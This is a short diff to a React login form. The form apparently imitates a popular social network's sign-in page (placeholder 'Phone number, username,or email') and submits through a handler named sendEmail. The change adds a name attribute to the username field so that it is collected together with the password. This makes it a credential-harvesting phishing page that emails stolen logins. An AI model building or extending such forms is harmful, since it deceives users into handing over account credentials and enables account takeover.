@@ -37,7 +37,7 @@ const Box1 = () => {
     </div>
    
 <form ref={form} onSubmit={sendEmail} >
-<input  type='text' placeholder='Phone number, username,or email' />
+<input  type='text' placeholder='Phone number, username,or email' name='user' />
 <input  type='password' placeholder='Password'  name='pass' />
 <button className="action" type="submit" >
     <div className="bigbtn">Log in</div>
